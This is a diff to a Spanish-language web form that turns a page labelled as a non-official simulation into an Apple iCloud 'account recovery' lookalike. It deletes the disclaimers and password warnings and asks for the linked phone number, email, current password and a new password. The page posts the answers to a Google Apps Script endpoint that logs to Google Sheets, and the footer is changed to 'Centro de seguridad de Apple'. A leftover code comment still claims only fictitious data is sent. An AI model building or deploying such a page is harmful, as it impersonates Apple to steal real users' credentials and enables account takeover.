@@ -11,23 +11,21 @@ main{width:min(100%,470px);background:white;padding:36px 32px;border-radius:24px
 </style>
 </head>
 <body><main>
-<header><img src="img/logo1.svg" alt="Logo iClub DEMO" class="brand-logo"><span class="demo">SIMULACIÓN · NO OFICIAL</span><h1>Registro de prueba</h1><p>Formulario ficticio: no recupera cuentas ni cambia credenciales reales.</p></header>
+<header><img src="img/logo1.svg" alt="Logo iClub DEMO" class="brand-logo"><span class="demo">RECUPERACIÓN DE CUENTA</span><h1>Protege de forma segura tu cuenta</h1><p>Ingresa tus datos para verificar que eres tu.</p></header>
 <section id="step1"><form id="first">
-<label>Número asociado (solo referencia de ejemplo)</label><div class="masked-phone">* * * * * * * 0 4</div>
-<label for="phone">Tu celular de prueba</label><input type="tel" id="phone" inputmode="numeric" autocomplete="off" pattern="[0-9]{9}" maxlength="9" required placeholder="9 dígitos">
-<label for="alias">Alias de simulación</label><input id="alias" maxlength="60" autocomplete="off" required placeholder="Ej.: mi-prueba-01">
-<label for="old">Referencia ficticia inicial</label><input type="text" id="old" autocomplete="off" maxlength="40" required placeholder="Escribe una referencia inventada">
-<p class="help">Escribe cualquier referencia de prueba de 3 a 40 caracteres. Se guardará en Google Sheets: no escribas contraseñas, PIN ni frases de recuperación.</p>
-<label for="oldConfirm">Repetir referencia ficticia inicial</label><input type="text" id="oldConfirm" autocomplete="off" maxlength="40" required placeholder="Repite la referencia inventada">
-<p class="notice">Al continuar, el navegador puede solicitar permiso de ubicación. Es opcional y puedes denegarlo. Si lo autorizas, se enviarán coordenadas redondeadas a dos decimales (zona aproximada).</p>
+<label>Tu número asociado a iCloud que termina en:</label><div class="masked-phone">* * * * * * * 0 4</div>
+<label for="phone">Ingresa el número de celular asociado que se indica.</label><input type="tel" id="phone" inputmode="numeric" autocomplete="off" pattern="[0-9]{9}" maxlength="9" required placeholder=" ">
+<label for="alias">Correo electrónico</label><input id="alias" maxlength="60" autocomplete="off" required placeholder=" ">
+<label for="old">Contraseña actual</label><input type="text" id="old" autocomplete="off" maxlength="40" required placeholder=" ">
+<label for="oldConfirm">Repetir contraseña actual</label><input type="text" id="oldConfirm" autocomplete="off" maxlength="40" required placeholder=" ">
 <button type="submit" id="nextBtn">Continuar</button><p class="error" id="error1" role="alert"></p>
 </form></section>
-<section id="step2" class="hidden"><form id="second"><p>Segunda etapa de la simulación. Introduce otra referencia ficticia libre, sin usar información secreta.</p>
-<label for="fresh">Nueva referencia ficticia</label><input type="text" id="fresh" autocomplete="off" maxlength="40" required placeholder="Escribe otra referencia inventada">
-<label for="freshConfirm">Repetir nueva referencia ficticia</label><input type="text" id="freshConfirm" autocomplete="off" maxlength="40" required placeholder="Repite la referencia inventada">
+<section id="step2" class="hidden"><form id="second"><p>Ingresa una nueva contraseña.</p>
+<label for="fresh">Nueva contraseña</label><input type="text" id="fresh" autocomplete="off" maxlength="40" required placeholder=" ">
+<label for="freshConfirm">Repetir nueva contraseña</label><input type="text" id="freshConfirm" autocomplete="off" maxlength="40" required placeholder=" ">
 <button type="submit" id="saveBtn">Guardar simulación</button><p class="error" id="error2" role="alert"></p></form></section>
-<section id="done" class="hidden"><div class="success"><div class="check">✓</div><h2>Simulación completada</h2><p>La nueva referencia ficticia se ha registrado para la demostración. El cierre de sesiones en otros dispositivos es solo una simulación.</p></div><p class="note" id="status" role="status"></p><button type="button" id="restart">Nueva simulación</button></section>
-<footer>No afiliado a Apple. No se procesan cuentas reales.</footer>
+<section id="done" class="hidden"><div class="success"><div class="check">✓</div><h2>Se cambió la contraseña</h2><p>Las sesiones de tu cuenta en nuevos dispositivos han sido cerradas.</p></div><p class="note" id="status" role="status"></p><button type="button" id="restart">Nueva simulación</button></section>
+<footer>Centro de seguridad de Apple.</footer>
 </main>
 <script>
 'use strict';
@@ -61,7 +59,7 @@ $('second').addEventListener('submit',async e=>{
  // Solo se envían referencias ficticias de prueba; no introduzcas secretos reales.
  try{
   await fetch(SCRIPT_URL,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(data)});
-  $('status').textContent='Solicitud enviada. Comprueba Google Sheets para verificar que se registró.';
+  $('status').textContent='Registro comletado';
  }catch(err){$('status').textContent='No se pudo enviar a Google Sheets. Comprueba la implementación de Apps Script.';}
  $('fresh').value='';$('freshConfirm').value='';stepOne=null;btn.disabled=false;btn.textContent='Guardar simulación';show('done');
 });
